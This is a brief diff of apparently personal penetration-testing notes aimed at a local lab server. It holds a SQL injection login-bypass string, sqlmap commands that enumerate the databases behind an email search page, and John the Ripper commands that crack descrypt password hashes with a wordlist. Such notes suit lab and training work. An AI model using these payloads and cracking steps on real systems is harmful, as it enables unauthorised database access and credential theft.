@@ -2,3 +2,8 @@ get user list------------ ' or '1'='1,
 
 sqlmap -u "http://127.0.0.1:9000/email_search.php?search=admin"
 sqlmap -u "http://127.0.0.1:9000/email_search.php?search=admin" --dbs
+
+john --list=formats
+john --format=descrypt --wordlist=/usr/local/share/john/password.lst <combined/password hash file name>
+john --show=left --format=descrypt combined ##view the crack password## 
+John the Ripper - http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
